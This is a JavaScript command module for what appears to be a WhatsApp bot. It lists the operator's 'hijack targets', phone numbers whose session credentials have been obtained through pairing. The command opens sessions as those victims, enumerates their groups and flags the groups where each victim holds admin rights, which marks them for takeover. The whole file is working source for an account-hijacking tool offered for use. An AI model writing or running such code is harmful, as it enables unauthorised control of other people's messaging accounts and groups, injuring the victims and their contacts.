// language: JavaScript, file: commands/hijack/hijacklist.js
'use strict';
const { readTargets, hasCreds, bootHijackSession } = require('../../lib/hijackSession');
const { extractPhone, rankOf }                     = require('../../lib/hijackHelper');

module.exports = {
    name: 'hijacklist',
    aliases: ['hlist', 'targets', 'hlistgroups'],
    category: 'hijack',
    desc: '📋 ʟɪsᴛ ʏᴏᴜʀ ᴘᴀɪʀᴇᴅ ᴛᴀʀɢᴇᴛs + ᴛʜᴇɪʀ ɢʀᴏᴜᴘs',
    usage: '.hijacklist',
    privateOnly: true,

    async execute(sock, msg, args, ctx) {
        const s        = ctx.settings;
        const scopeKey = ctx.sender;
        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        const targets = readTargets(scopeKey);
        if (!targets.length) {
            return ctx.reply(`📭 ɴᴏ ᴘᴀɪʀᴇᴅ ᴛᴀʀɢᴇᴛs. ᴜsᴇ .hijackpairing <ᴘʜᴏɴᴇ>.${s.FOOTER}`);
        }

        let out = `╭═══〘 ʜɪᴊᴀᴄᴋ ᴛᴀʀɢᴇᴛs 〙═══⊷❍\n`;
        out    += `┃ sᴄᴏᴘᴇ: ${extractPhone(scopeKey)}\n`;

        for (const phone of targets) {
            const ready = hasCreds(scopeKey, phone);
            out += `┃ ${ready ? '🟢' : '🔴'} +${phone}\n`;
            if (!ready) continue;

            try {
                // Reuses active socket if already open, or boots it
                const hs = await bootHijackSession(scopeKey, phone);
                const groups = await hs.groupFetchAllParticipating().catch(() => ({}));
                const list   = Object.values(groups || {});
                if (!list.length) { out += `┃   └ ɴᴏ ɢʀᴏᴜᴘs\n`; }
                for (const g of list) {
                    const mine = (g.participants || []).find(p => extractPhone(p.id) === phone);
                    const rank = rankOf(mine);
                    const can  = rank === 2 ? '🎯' : rank === 1 ? '🟡' : '⚪';
                    out += `┃   ${can} ${g.subject || g.id}\n`;
                }
            } catch (e) {
                out += `┃   └ ᴇʀʀ: ${e.message.slice(0, 40)}\n`;
            }
        }

        out += `╰══════════════════════════`;
        return ctx.reply(out + s.FOOTER);
    }
};